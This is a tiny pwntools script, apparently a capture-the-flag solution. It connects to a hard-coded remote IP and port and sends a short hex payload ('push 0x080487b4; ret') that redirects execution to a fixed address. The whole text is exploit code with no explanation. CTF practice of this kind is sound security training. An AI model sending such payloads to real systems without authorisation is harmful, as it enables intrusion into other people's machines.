from pwn import *

io = remote('188.166.233.168', 4790)

io.send(b'68B4870408C3')
print(io.recvall())
